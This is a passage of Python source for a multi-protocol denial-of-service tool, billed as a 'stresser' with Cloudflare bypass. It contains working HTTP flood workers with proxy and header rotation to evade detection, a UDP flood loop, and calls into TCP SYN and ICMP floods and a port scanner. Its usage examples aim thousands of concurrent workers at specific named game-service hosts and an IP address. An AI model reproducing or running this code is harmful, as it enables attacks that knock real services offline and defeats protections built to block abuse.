        proxy = None
        if self.use_proxy and self.proxy_rotator:
            proxy = self.proxy_rotator.get_random()
            self.last_proxy = proxy
        
        if self.cookies:
            headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in self.cookies.items()])
        
        for attempt in range(self.retries + 1):
            retry_count = attempt
            try:
                async with self.session.get(
                    self.url,
                    headers=headers,
                    ssl=SSL_CONTEXT,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=self.timeout)
                ) as response:
                    html = await response.text()
                    latency = time.perf_counter() - start
                    
                    cf_detection = detect_cloudflare_block(response, html)
                    
                    if response.cookies:
                        self.cookies.update(response.cookies)
                    
                    parsed = urlparse(self.url)
                    port = parsed.port or (443 if parsed.scheme == "https" else 80)
                    
                    result = RequestResult(
                        url=self.url,
                        status=response.status,
                        latency=latency,
                        success=200 <= response.status < 400,
                        cloudflare_blocked=cf_detection["blocked"],
                        cloudflare_status=cf_detection["status"],
                        cf_ray=cf_detection.get("cf_ray"),
                        cf_ray_id=cf_detection.get("cf_ray_id"),
                        response_size=len(html),
                        headers=dict(response.headers),
                        proxy_used=proxy,
                        retry_count=attempt,
                        worker_id=self.worker_id,
                        protocol=parsed.scheme,
                        port=port,
                        attack_type=AttackType.HTTP
                    )
                    
                    if cf_detection["blocked"] and cf_detection["status"] in [
                        CloudflareStatus.CHALLENGE,
                        CloudflareStatus.CAPTCHA
                    ]:
                        if attempt < self.retries:
                            await asyncio.sleep(1 * (attempt + 1))
                            continue
                    
                    return result
                    
            except asyncio.TimeoutError:
                if attempt == self.retries:
                    parsed = urlparse(self.url)
                    return RequestResult(
                        url=self.url,
                        status=0,
                        latency=time.perf_counter() - start,
                        error="timeout",
                        cloudflare_blocked=True,
                        cloudflare_status=CloudflareStatus.TIMEOUT,
                        proxy_used=proxy,
                        retry_count=attempt,
                        worker_id=self.worker_id,
                        protocol=parsed.scheme,
                        port=parsed.port or (443 if parsed.scheme == "https" else 80),
                        attack_type=AttackType.HTTP
                    )
                await asyncio.sleep(0.5 * (attempt + 1))
                
            except aiohttp.ClientError as e:
                if attempt == self.retries:
                    parsed = urlparse(self.url)
                    return RequestResult(
                        url=self.url,
                        status=0,
                        latency=time.perf_counter() - start,
                        error=str(e),
                        cloudflare_blocked=True,
                        cloudflare_status=CloudflareStatus.CONNECTION_ERROR,
                        proxy_used=proxy,
                        retry_count=attempt,
                        worker_id=self.worker_id,
                        protocol=parsed.scheme,
                        port=parsed.port or (443 if parsed.scheme == "https" else 80),
                        attack_type=AttackType.HTTP
                    )
                await asyncio.sleep(0.5 * (attempt + 1))
                
            except Exception as e:
                if attempt == self.retries:
                    parsed = urlparse(self.url)
                    return RequestResult(
                        url=self.url,
                        status=0,
                        latency=time.perf_counter() - start,
                        error=str(e),
                        proxy_used=proxy,
                        retry_count=attempt,
                        worker_id=self.worker_id,
                        protocol=parsed.scheme,
                        port=parsed.port or (443 if parsed.scheme == "https" else 80),
                        attack_type=AttackType.HTTP
                    )
                await asyncio.sleep(0.5 * (attempt + 1))
        
        parsed = urlparse(self.url)
        return RequestResult(
            url=self.url,
            status=0,
            latency=time.perf_counter() - start,
            error="max_retries_exceeded",
            proxy_used=proxy,
            retry_count=retry_count,
            worker_id=self.worker_id,
            protocol=parsed.scheme,
            port=parsed.port or (443 if parsed.scheme == "https" else 80),
            attack_type=AttackType.HTTP
        )

# ============================================
# UDP FLOOD WORKER
# ============================================

class UDPFloodWorker:
    """Worker for UDP flood attacks"""
    
    def __init__(self, target_ip: str, target_port: int, packet_size: int = DEFAULT_PACKET_SIZE):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size
        self.packet_count = 0
        self.running = False
    
    def start(self, duration: int):
        """Start UDP flood"""
        self.running = True
        self.packet_count = 0
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(self.packet_size)
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self.packet_count += 1
            except:
                pass
        
        sock.close()
        self.running = False
    
    def get_stats(self) -> Dict:
        return {
            "packets_sent": self.packet_count,
            "target": f"{self.target_ip}:{self.target_port}"
        }

# ============================================
# DASHBOARD
# ============================================

class AccurateDashboard:
    """Live dashboard with accurate metrics"""
    
    def __init__(self, console: Console, stats: GlobalStats, target: str, concurrency: int, duration: int):
        self.console = console
        self.stats = stats
        self.target = target
        self.concurrency = concurrency
        self.duration = duration
        self.running = True
        self.start_time = time.time()
    
    def render(self) -> Panel:
        """Render the dashboard"""
        elapsed = self.stats.elapsed
        total = self.stats.total_requests
        
        content = []
        
        content.append(f"[bold red]⚡ MULTI-PROTOCOL STRESSER V{VERSION}[/bold red]")
        content.append(f"[white]Target: {self.target}[/white]")
        content.append(f"[white]Workers: {self.concurrency:,} | Duration: {self.duration}s | Elapsed: {elapsed:.1f}s[/white]")
        content.append(f"[white]Requests: {total:,} | RPS: [bold green]{self.stats.rps:.2f}[/bold green][/white]")
        content.append(f"[white]UDP: {self.stats.udp_packets:,} | SYN: {self.stats.syn_packets:,} | ICMP: {self.stats.icmp_packets:,}[/white]")
        content.append("")
        
        success_rate = self.stats.success_rate
        cf_rate = self.stats.cloudflare_rate
        
        success_color = "green" if success_rate > 80 else "yellow" if success_rate > 50 else "red"
        cf_color = "red" if cf_rate > 50 else "yellow" if cf_rate > 20 else "green"
        
        content.append("📊 METRICS:")
        content.append(f"   ✅ SUCCESS RATE: [{success_color}]{success_rate:.1f}%[/{success_color}]")
        content.append(f"   ❌ ERROR RATE: [{success_color}]{self.stats.error_rate:.1f}%[/{success_color}]")
        content.append(f"   🛡️ CLOUDFLARE BLOCKED: [{cf_color}]{cf_rate:.1f}%[/{cf_color}]")
        content.append("")
        
        content.append("📦 COUNTS:")
        content.append(f"   Total: {total:,}")
        content.append(f"   ✅ Successful: {self.stats.successful:,}")
        content.append(f"   ❌ Failed: {self.stats.failed:,}")
        content.append(f"   ⏱️ Timeouts: {self.stats.timeouts:,}")
        content.append(f"   🧩 CF Challenge: {self.stats.cloudflare_challenge:,}")
        content.append(f"   🔒 CF CAPTCHA: {self.stats.cloudflare_captcha:,}")
        content.append(f"   🚫 CF Rate Limit: {self.stats.cloudflare_rate_limited:,}")
        content.append("")
        
        if self.stats.latencies:
            p50 = self.stats.get_percentile(50)
            p75 = self.stats.get_percentile(75)
            p90 = self.stats.get_percentile(90)
            p95 = self.stats.get_percentile(95)
            p99 = self.stats.get_percentile(99)
            avg = sum(self.stats.latencies) / len(self.stats.latencies) if self.stats.latencies else 0
            
            content.append("⏱️ LATENCY:")
            content.append(f"   P50: {p50:.4f}s | P75: {p75:.4f}s")
            content.append(f"   P90: {p90:.4f}s | P95: {p95:.4f}s | P99: {p99:.4f}s")
            content.append(f"   AVG: {avg:.4f}s | MIN: {min(self.stats.latencies):.4f}s | MAX: {max(self.stats.latencies):.4f}s")
            content.append("")
        
        if self.stats.status_codes:
            content.append("📋 STATUS CODES:")
            code_parts = []
            for code, count in sorted(self.stats.status_codes.items()):
                if code == 0:
                    color = "red"
                    label = "ERROR"
                elif 200 <= code < 300:
                    color = "green"
                    label = str(code)
                elif 300 <= code < 400:
                    color = "yellow"
                    label = str(code)
                elif 400 <= code < 500:
                    color = "orange"
                    label = str(code)
                elif 500 <= code < 600:
                    color = "red"
                    label = str(code)
                else:
                    color = "white"
                    label = str(code)
                code_parts.append(f"[{color}]{label}[/{color}]: {count:,}")
            content.append("   " + " | ".join(code_parts))
            content.append("")
        
        if len(self.stats.target_stats) > 1:
            content.append("🎯 PER-TARGET:")
            for url, stats in self.stats.target_stats.items():
                short_url = url.replace("https://", "").replace("http://", "")[:30]
                rate = stats.success_rate
                color = "green" if rate > 80 else "yellow" if rate > 50 else "red"
                content.append(f"   {short_url}: {stats.total_requests:,} req, [{color}]{rate:.1f}%[/{color}]")
            content.append("")
        
        progress = min(elapsed / self.duration, 1.0) if self.duration > 0 else 0
        bar_len = 50
        filled = int(bar_len * progress)
        bar = "█" * filled + "░" * (bar_len - filled)
        content.append(f"[bold yellow]⚡ {bar} {progress*100:.0f}%[/bold yellow]")
        
        if self.running:
            content.append("[bold green]▶ STRESSING... Press Ctrl+C to stop[/bold green]")
        else:
            content.append("[bold red]⏹ COMPLETE[/bold red]")
        
        return Panel("\n".join(content), border_style="red")

# ============================================
# STRESSER ENGINE WITH MULTI-ATTACK TYPE SUPPORT
# ============================================

class AccurateStressEngine:
    """Main stress engine with accurate metrics and multiple attack types"""
    
    def __init__(
        self,
        targets: List[str],
        concurrency: int = DEFAULT_CONCURRENCY,
        duration: int = DEFAULT_DURATION,
        timeout: float = DEFAULT_TIMEOUT,
        retries: int = DEFAULT_RETRIES,
        proxies: List[str] = None,
        rotate_headers: bool = True,
        use_proxy: bool = False,
        attack_types: List[str] = None,
        udp_threads: int = DEFAULT_UDP_THREADS,
        packet_size: int = DEFAULT_PACKET_SIZE
    ):
        self.targets = targets
        self.concurrency = concurrency
        self.duration = duration
        self.timeout = timeout
        self.retries = retries
        self.proxies = proxies or []
        self.rotate_headers = rotate_headers
        self.use_proxy = use_proxy
        self.attack_types = attack_types or [AttackType.HTTP]
        self.udp_threads = udp_threads
        self.packet_size = packet_size
        self.stats = GlobalStats()
        self.running = False
        self.workers: List[asyncio.Task] = []
        self.session: Optional[aiohttp.ClientSession] = None
        self.proxy_rotator: Optional[ProxyRotator] = None
        self.header_rotator: Optional[HeaderRotator] = None
        self.console = Console()
        self.dashboard: Optional[AccurateDashboard] = None
    
    async def start(self) -> GlobalStats:
        """Start the stress test with multiple attack types"""
        self.stats.start_time = time.time()
        self.running = True
        
        if self.use_proxy and self.proxies:
            self.proxy_rotator = ProxyRotator(self.proxies)
        
        if self.rotate_headers:
            self.header_rotator = HeaderRotator(use_cloudflare_headers=True)
        
        # Check if HTTP/HTTPS attacks are enabled
        if AttackType.HTTP in self.attack_types or AttackType.HTTPS in self.attack_types:
            connector = aiohttp.TCPConnector(
                limit=self.concurrency,
                limit_per_host=self.concurrency,
                enable_cleanup_closed=True,
                ssl=SSL_CONTEXT,
                force_close=False,
                ttl_dns_cache=300,
                keepalive_timeout=30,
            )
            
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=self.timeout)
            )
            
            # Create workers for HTTP/HTTPS targets
            for target in self.targets:
                # Check if target matches the attack type
                is_https = target.startswith("https://")
                is_http = target.startswith("http://")
                
                if (AttackType.HTTPS in self.attack_types and is_https) or \
                   (AttackType.HTTP in self.attack_types and is_http):
                    for i in range(self.concurrency):
                        worker = AccurateWorker(
                            session=self.session,
                            url=target,
                            worker_id=i,
                            timeout=self.timeout,
                            retries=self.retries,
                            proxy_rotator=self.proxy_rotator,
                            header_rotator=self.header_rotator,
                            use_proxy=self.use_proxy
                        )
                        task = asyncio.create_task(self._worker_loop(worker))
                        self.workers.append(task)
        
        # UDP Flood Attack
        if AttackType.UDP in self.attack_types:
            for target in self.targets:
                parsed = urlparse(target)
                if parsed.netloc:
                    host = parsed.hostname or parsed.netloc.split(":")[0]
                    port = parsed.port or 80
                    # Start UDP flood in background
                    udp_worker = UDPFloodWorker(host, port, self.packet_size)
                    await asyncio.to_thread(udp_worker.start, self.duration)
                    self.stats.udp_packets += udp_worker.packet_count
        
        # TCP SYN Attack
        if AttackType.TCP_SYN in self.attack_types:
            for target in self.targets:
                parsed = urlparse(target)
                if parsed.netloc:
                    host = parsed.hostname or parsed.netloc.split(":")[0]
                    port = parsed.port or 80
                    syn_worker = TCPSYNFlood(host, port)
                    await asyncio.to_thread(syn_worker.start, self.duration, self.udp_threads)
                    self.stats.syn_packets += syn_worker.packet_count
        
        # ICMP Attack
        if AttackType.ICMP in self.attack_types:
            for target in self.targets:
                parsed = urlparse(target)
                if parsed.netloc:
                    host = parsed.hostname or parsed.netloc.split(":")[0]
                    icmp_worker = ICMPFlood(host)
                    await asyncio.to_thread(icmp_worker.start, self.duration, self.udp_threads)
                    self.stats.icmp_packets += icmp_worker.packet_count
        
        # Create dashboard
        attack_types_str = ", ".join(self.attack_types).upper()
        self.dashboard = AccurateDashboard(
            console=self.console,
            stats=self.stats,
            target=f"{len(self.targets)} targets [{attack_types_str}]",
            concurrency=self.concurrency,
            duration=self.duration
        )
        
        # Start dashboard
        try:
            with Live(self.dashboard.render(), refresh_per_second=10, screen=True) as live:
                while self.running and time.time() - self.stats.start_time < self.duration:
                    live.update(self.dashboard.render())
                    await asyncio.sleep(0.05)
                
                self.running = False
                self.dashboard.running = False
                live.update(self.dashboard.render())
                await asyncio.sleep(0.5)
                
        except KeyboardInterrupt:
            self.console.print("\n[yellow]⚠️ Stopped by user[/yellow]")
            self.running = False
        
        finally:
            self.running = False
            self.stats.end_time = time.time()
            
            for worker in self.workers:
                worker.cancel()
            await asyncio.gather(*self.workers, return_exceptions=True)
            
            if self.session:
                await self.session.close()
            
            self.dashboard.running = False
        
        return self.stats
    
    async def _worker_loop(self, worker: AccurateWorker):
        """Worker loop"""
        while self.running and time.time() - self.stats.start_time < self.duration:
            result = await worker.make_request()
            self.stats.add_result(result)

# ============================================
# REPORT GENERATOR
# ============================================

class ReportGenerator:
    """Generate reports from stress test results"""
    
    @staticmethod
    def generate_text_report(stats: GlobalStats, config: Dict[str, Any]) -> str:
        """Generate text report"""
        lines = []
        lines.append("=" * 80)
        lines.append(f"STRESS TEST REPORT - V{VERSION}")
        lines.append("=" * 80)
        lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append("")
        lines.append("CONFIGURATION:")
        for key, value in config.items():
            lines.append(f"  {key}: {value}")
        lines.append("")
        lines.append("GLOBAL STATISTICS:")
        lines.append(f"  Total Requests: {stats.total_requests:,}")
        lines.append(f"  Successful: {stats.successful:,} ({stats.success_rate:.1f}%)")
        lines.append(f"  Failed: {stats.failed:,} ({stats.error_rate:.1f}%)")
        lines.append(f"  Cloudflare Blocked: {stats.cloudflare_blocked:,} ({stats.cloudflare_rate:.1f}%)")
        lines.append(f"    - Challenges: {stats.cloudflare_challenge:,}")
        lines.append(f"    - CAPTCHA: {stats.cloudflare_captcha:,}")
        lines.append(f"    - Rate Limited: {stats.cloudflare_rate_limited:,}")
        lines.append(f"  Timeouts: {stats.timeouts:,}")
        lines.append(f"  Connection Errors: {stats.connection_errors:,}")
        lines.append(f"  UDP Packets: {stats.udp_packets:,}")
        lines.append(f"  SYN Packets: {stats.syn_packets:,}")
        lines.append(f"  ICMP Packets: {stats.icmp_packets:,}")
        lines.append(f"  RPS: {stats.rps:.2f}")
        lines.append(f"  Elapsed: {stats.elapsed:.1f}s")
        lines.append("")
        lines.append("LATENCY METRICS:")
        if stats.latencies:
            lines.append(f"  P50: {stats.get_percentile(50):.4f}s")
            lines.append(f"  P75: {stats.get_percentile(75):.4f}s")
            lines.append(f"  P90: {stats.get_percentile(90):.4f}s")
            lines.append(f"  P95: {stats.get_percentile(95):.4f}s")
            lines.append(f"  P99: {stats.get_percentile(99):.4f}s")
            lines.append(f"  AVG: {sum(stats.latencies) / len(stats.latencies):.4f}s")
            lines.append(f"  MIN: {min(stats.latencies):.4f}s")
            lines.append(f"  MAX: {max(stats.latencies):.4f}s")
        else:
            lines.append("  No latency data available")
        lines.append("")
        lines.append("STATUS CODE DISTRIBUTION:")
        for code, count in sorted(stats.status_codes.items()):
            label = "TIMEOUT" if code == 0 else str(code)
            pct = (count / stats.total_requests * 100) if stats.total_requests > 0 else 0
            lines.append(f"  {label}: {count:,} ({pct:.1f}%)")
        lines.append("")
        
        if stats.target_stats:
            lines.append("PER-TARGET STATISTICS:")
            for url, target_stats in stats.target_stats.items():
                lines.append(f"\n  Target: {url}")
                lines.append(f"    Requests: {target_stats.total_requests:,}")
                lines.append(f"    Success Rate: {target_stats.success_rate:.1f}%")
                lines.append(f"    Cloudflare Blocked: {target_stats.cloudflare_blocked:,} ({target_stats.cloudflare_rate:.1f}%)")
                lines.append(f"    P95: {target_stats.get_percentile(95):.4f}s")
                lines.append(f"    RPS: {target_stats.total_requests / stats.elapsed:.2f}")
                if target_stats.status_codes:
                    lines.append("    Status Codes:")
                    for code, count in sorted(target_stats.status_codes.items()):
                        label = "TIMEOUT" if code == 0 else str(code)
                        lines.append(f"      {label}: {count:,}")
        
        lines.append("")
        lines.append("=" * 80)
        lines.append("END OF REPORT")
        lines.append("=" * 80)
        
        return "\n".join(lines)
    
    @staticmethod
    async def save_json(stats: GlobalStats, config: Dict[str, Any], filename: str = "stress_report.json"):
        """Save report as JSON"""
        data = {
            "version": VERSION,
            "timestamp": datetime.now().isoformat(),
            "config": config,
            "global": {
                "total_requests": stats.total_requests,
                "successful": stats.successful,
                "failed": stats.failed,
                "cloudflare_blocked": stats.cloudflare_blocked,
                "cloudflare_challenge": stats.cloudflare_challenge,
                "cloudflare_captcha": stats.cloudflare_captcha,
                "cloudflare_rate_limited": stats.cloudflare_rate_limited,
                "timeouts": stats.timeouts,
                "connection_errors": stats.connection_errors,
                "udp_packets": stats.udp_packets,
                "syn_packets": stats.syn_packets,
                "icmp_packets": stats.icmp_packets,
                "success_rate": stats.success_rate,
                "error_rate": stats.error_rate,
                "cloudflare_rate": stats.cloudflare_rate,
                "rps": stats.rps,
                "elapsed": stats.elapsed,
                "latencies": {
                    "p50": stats.get_percentile(50),
                    "p75": stats.get_percentile(75),
                    "p90": stats.get_percentile(90),
                    "p95": stats.get_percentile(95),
                    "p99": stats.get_percentile(99),
                    "avg": sum(stats.latencies) / len(stats.latencies) if stats.latencies else 0,
                    "min": min(stats.latencies) if stats.latencies else 0,
                    "max": max(stats.latencies) if stats.latencies else 0,
                },
                "status_codes": dict(stats.status_codes),
                "unique_cf_rays": len(set(stats.cf_rays))
            },
            "targets": {}
        }
        
        for url, target_stats in stats.target_stats.items():
            data["targets"][url] = {
                "total_requests": target_stats.total_requests,
                "successful": target_stats.successful,
                "failed": target_stats.failed,
                "cloudflare_blocked": target_stats.cloudflare_blocked,
                "cloudflare_challenge": target_stats.cloudflare_challenge,
                "cloudflare_captcha": target_stats.cloudflare_captcha,
                "cloudflare_rate_limited": target_stats.cloudflare_rate_limited,
                "timeouts": target_stats.timeouts,
                "connection_errors": target_stats.connection_errors,
                "success_rate": target_stats.success_rate,
                "error_rate": target_stats.error_rate,
                "cloudflare_rate": target_stats.cloudflare_rate,
                "rps": target_stats.total_requests / stats.elapsed if stats.elapsed > 0 else 0,
                "latencies": {
                    "p50": target_stats.get_percentile(50),
                    "p75": target_stats.get_percentile(75),
                    "p90": target_stats.get_percentile(90),
                    "p95": target_stats.get_percentile(95),
                    "p99": target_stats.get_percentile(99),
                    "avg": target_stats.avg_latency,
                    "min": target_stats.min_latency,
                    "max": target_stats.max_latency,
                },
                "status_codes": dict(target_stats.status_codes)
            }
        
        async with aiofiles.open(filename, "w", encoding="utf-8") as f:
            await f.write(json.dumps(data, indent=2))
    
    @staticmethod
    async def save_csv(stats: GlobalStats, filename: str = "stress_report.csv"):
        """Save report as CSV"""
        async with aiofiles.open(filename, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            
            writer.writerow([
                "timestamp", "url", "status", "latency", "success",
                "cloudflare_blocked", "cloudflare_status", "cf_ray", "error"
            ])
            
            writer.writerow([
                datetime.now().isoformat(),
                "summary",
                stats.total_requests,
                stats.success_rate,
                stats.cloudflare_rate,
                "",
                "",
                "",
                ""
            ])

# ============================================
# COMMAND LINE INTERFACE
# ============================================

def parse_args() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Advanced Multi-Protocol Attack Tool with Cloudflare Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # HTTP + HTTPS Attack
  python3 stresser.py --target https://account.mythgames.net/ --concurrency 3000 --duration 60 --attack-type http,https
  
  # HTTP + HTTPS + TCP SYN
  python3 stresser.py --target https://account.mythgames.net/ --concurrency 3000 --duration 60 --attack-type http,https,tcp_syn
  
  # UDP Flood Attack
  python3 stresser.py --target 172.67.71.232:64000 --attack-type udp --duration 60
  
  # All Protocols
  python3 stresser.py --target 172.67.71.232:64000 --attack-type all --duration 60
  
  # Multi-target attack
  python3 stresser.py --targets https://account.mythgames.net/ https://auth.mythgames.net/ --concurrency 2000 --duration 30 --attack-type http,https
  
  # With proxies
  python3 stresser.py --target https://account.mythgames.net/ --concurrency 3000 --duration 60 --proxies "proxy1:8080,proxy2:8080"
  
  # Scan ports
  python3 stresser.py --scan --target 172.67.71.232
        """
    )
    
    # Target options
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument(
        "--target",
        help="Single target URL or IP:port"
    )
    target_group.add_argument(
        "--targets",
        nargs="+",
        help="Multiple target URLs"
    )
    
    # Attack type (supports comma-separated)
    parser.add_argument(
        "--attack-type",
        default="http",
        help="Attack types: http,https,tcp_syn,udp,icmp,all (comma-separated)"
    )
    
    # UDP options
    parser.add_argument(
        "--packet-size",
        type=int,
        default=DEFAULT_PACKET_SIZE,
        help=f"UDP packet size in bytes (default: {DEFAULT_PACKET_SIZE})"
    )
    parser.add_argument(
        "--udp-threads",
        type=int,
        default=DEFAULT_UDP_THREADS,
        help=f"Number of UDP threads (default: {DEFAULT_UDP_THREADS})"
    )
    
    # Scan option
    parser.add_argument(
        "--scan",
        action="store_true",
        help="Scan for open ports on target IP"
    )
    parser.add_argument(
        "--scan-ports",
        help="Comma-separated list of ports to scan (default: common ports)"
    )
    
    # Performance options
    parser.add_argument(
        "--concurrency",
        type=int,
        default=DEFAULT_CONCURRENCY,
        help=f"Concurrent workers per target (default: {DEFAULT_CONCURRENCY})"
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=DEFAULT_DURATION,
        help=f"Duration in seconds (default: {DEFAULT_DURATION})"
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})"
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=DEFAULT_RETRIES,
        help=f"Number of retries (default: {DEFAULT_RETRIES})"
    )
    parser.add_argument(
        "--warmup",
        type=int,
        default=DEFAULT_WARMUP,
        help=f"Warmup duration in seconds (default: {DEFAULT_WARMUP})"
    )
    
    # Bypass options
    parser.add_argument(
        "--bypass-cloudflare",
        action="store_true",
        help="Enable Cloudflare bypass strategies"
    )
    parser.add_argument(
        "--rotate-headers",
        action="store_true",
        help="Rotate headers to avoid detection"
    )
    parser.add_argument(
        "--proxies",
        help="Comma-separated list of proxies (format: http://ip:port)"
    )
    parser.add_argument(
        "--proxy-rotation",
        type=int,
        default=DEFAULT_PROXY_ROTATION,
        help=f"Rotate proxy every N requests (default: {DEFAULT_PROXY_ROTATION})"
    )
    
    # Output options
    parser.add_argument(
        "--save-report",
        action="store_true",
        help="Save text report to file"
    )
    parser.add_argument(
        "--save-json",
        action="store_true",
        help="Save JSON report to file"
    )
    parser.add_argument(
        "--save-csv",
        action="store_true",
        help="Save CSV report to file"
    )
    parser.add_argument(
        "--report-file",
        default="stress_report.txt",
        help="Report filename (default: stress_report.txt)"
    )
    parser.add_argument(
        "--json-file",
        default="stress_report.json",
        help="JSON filename (default: stress_report.json)"
    )
    parser.add_argument(
        "--csv-file",
        default="stress_report.csv",
        help="CSV filename (default: stress_report.csv)"
    )
    
    # Display options
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose logging"
    )
    parser.add_argument(
        "--quiet",
        action="store_true",
        help="Suppress all output except errors"
    )
    parser.add_argument(
        "--no-dashboard",
        action="store_true",
        help="Disable live dashboard"
    )
    
    return parser.parse_args()

# ============================================
# MAIN EXECUTION
# ============================================

async def main_async(args: argparse.Namespace) -> None:
    """Main async entry point"""
    console = Console()
    
    log_level = logging.DEBUG if args.verbose else logging.WARNING
    if args.quiet:
        log_level = logging.ERROR
    
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s %(levelname)s %(message)s",
    )
    
    # Handle scan mode
    if args.scan:
        if not args.target:
            console.print("[red]❌ Please specify target IP with --target[/red]")
            return
        
        console.print(f"[bold cyan]🔍 Scanning target: {args.target}[/bold cyan]")
        
        scanner = PortScanner(args.target)
        ports_to_scan = []
        
        if args.scan_ports:
            ports_to_scan = [int(p.strip()) for p in args.scan_ports.split(",") if p.strip()]
        else:
            ports_to_scan = [
                80, 443, 8080, 8443, 55910, 63998, 63999, 64000, 64001, 64002,
                64003, 64004, 64005, 64006, 36998, 62694, 62695, 50768, 50769,
                57777, 52288, 52289, 52290, 63269, 50315, 50316, 19443
            ]
        
        console.print(f"[yellow]Scanning {len(ports_to_scan)} ports...[/yellow]\n")
        
        console.print("[bold]TCP Ports:[/bold]")
        tcp_open = []
        for port in ports_to_scan:
            if scanner.scan_tcp_port(port):
                tcp_open.append(port)
                console.print(f"  [green]✅ Port {port} is OPEN[/green]")
            else:
                console.print(f"  [red]❌ Port {port} is CLOSED[/red]")
        
        console.print("\n[bold]UDP Ports:[/bold]")
        udp_open = []
        for port in ports_to_scan[:10]:
            if scanner.scan_udp_port(port):
                udp_open.append(port)
                console.print(f"  [green]✅ Port {port} is OPEN[/green]")
            else:
                console.print(f"  [red]❌ Port {port} is CLOSED[/red]")
        
        console.print("\n[bold cyan]📊 SCAN SUMMARY:[/bold cyan]")
        console.print(f"  TCP Open Ports: {len(tcp_open)}")
        console.print(f"  UDP Open Ports: {len(udp_open)}")
        
        if tcp_open:
            console.print(f"\n[bold green]✅ Generated Targets:[/bold green]")
            for port in tcp_open:
                console.print(f"  https://{args.target}:{port}/")
                console.print(f"  http://{args.target}:{port}/")
        
        return
    
    # Parse targets
    if args.target:
        targets = [args.target]
    else:
        targets = args.targets
    
    # Validate targets
    valid_targets = []
    for t in targets:
        t = t.strip()
        if t:
            if not t.startswith(("http://", "https://")):
                if ":" in t:
                    parts = t.split(":")
                    if len(parts) == 2 and parts[1].isdigit():
                        protocol = auto_detect_protocol(t)
                        t = f"{protocol}://{t}"
                    else:
                        t = f"https://{t}"
                else:
                    t = f"https://{t}"
            valid_targets.append(t)
    
    if not valid_targets:
        console.print("[red]❌ No valid targets specified![/red]")
        return
    
    # Parse attack types
    attack_types = AttackType.parse_attack_types(args.attack_type)
    
    # Parse proxies
    proxy_list = []
    if args.proxies:
        proxy_list = [p.strip() for p in args.proxies.split(",") if p.strip()]
    
    # Show banner
    console.print(Panel.fit(
        f"[bold red]⚡ MULTI-PROTOCOL STRESSER V{VERSION}[/bold red]\n"
        f"[white]Targets: {len(valid_targets)}[/white]\n"
        f"[white]Attack Types: {', '.join(attack_types).upper()}[/white]\n"
        f"[white]Concurrency: {args.concurrency:,} per target[/white]\n"
        f"[white]Duration: {args.duration}s | Timeout: {args.timeout}s[/white]\n"
        f"[white]Retries: {args.retries} | Proxies: {len(proxy_list)}[/white]\n"
        f"[white]Cloudflare Bypass: {'✅' if args.bypass_cloudflare else '❌'}[/white]\n"
        f"[white]Header Rotation: {'✅' if args.rotate_headers else '❌'}[/white]\n"
        f"[bold green]✅ Multi-Protocol Attack ENABLED[/bold green]",
        border_style="red"
    ))
    
    # Show targets
    target_table = Table(title="🎯 Targets", box=box.ROUNDED)
    target_table.add_column("#", style="cyan")
    target_table.add_column("URL", style="white")
    target_table.add_column("Protocol", style="white")
    
    for i, target in enumerate(valid_targets, 1):
        protocol = "https" if target.startswith("https://") else "http"
        color = "green" if protocol == "https" else "yellow"
        target_table.add_row(str(i), target, f"[{color}]{protocol}[/{color}]")
    
    console.print(target_table)
    
    if proxy_list:
        console.print(f"[green]✅ Using {len(proxy_list)} proxies for rotation[/green]")
    else:
        console.print("[yellow]⚠️ No proxies provided - using direct connection[/yellow]")
    
    console.print("\n[yellow]⚠️ Starting multi-protocol stress test... Press Ctrl+C to stop[/yellow]\n")
    
    # Create engine
    engine = AccurateStressEngine(
        targets=valid_targets,
        concurrency=args.concurrency,
        duration=args.duration,
        timeout=args.timeout,
        retries=args.retries,
        proxies=proxy_list,
        rotate_headers=args.rotate_headers or args.bypass_cloudflare,
        use_proxy=bool(proxy_list),
        attack_types=attack_types,
        udp_threads=args.udp_threads,
        packet_size=args.packet_size
    )
    
    def signal_handler(sig, frame):
        console.print("\n[yellow]⚠️ Stopping stress test...[/yellow]")
        engine.running = False
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        stats = await engine.start()
        
        console.print("\n[bold green]✅ STRESS TEST COMPLETE![/bold green]")
        
        if args.save_report:
            config = {
                "targets": valid_targets,
                "attack_types": attack_types,
                "concurrency": args.concurrency,
                "duration": args.duration,
                "timeout": args.timeout,
                "retries": args.retries,
                "proxies": len(proxy_list),
                "bypass_cloudflare": args.bypass_cloudflare,
                "rotate_headers": args.rotate_headers,
            }
            report = ReportGenerator.generate_text_report(stats, config)
            with open(args.report_file, "w", encoding="utf-8") as f:
                f.write(report)
            console.print(f"[green]✅ Text report saved to {args.report_file}[/green]")
        
        if args.save_json:
            config = {
                "targets": valid_targets,
                "attack_types": attack_types,
                "concurrency": args.concurrency,
                "duration": args.duration,
                "timeout": args.timeout,
                "retries": args.retries,
                "proxies": len(proxy_list),
                "bypass_cloudflare": args.bypass_cloudflare,
                "rotate_headers": args.rotate_headers,
            }
            await ReportGenerator.save_json(stats, config, args.json_file)
            console.print(f"[green]✅ JSON report saved to {args.json_file}[/green]")
        
        if args.save_csv:
            await ReportGenerator.save_csv(stats, args.csv_file)
            console.print(f"[green]✅ CSV report saved to {args.csv_file}[/green]")
        
        console.print("\n[bold]📊 SUMMARY:[/bold]")
        console.print(f"  Total Requests: {stats.total_requests:,}")
        console.print(f"  Success Rate: {stats.success_rate:.1f}%")
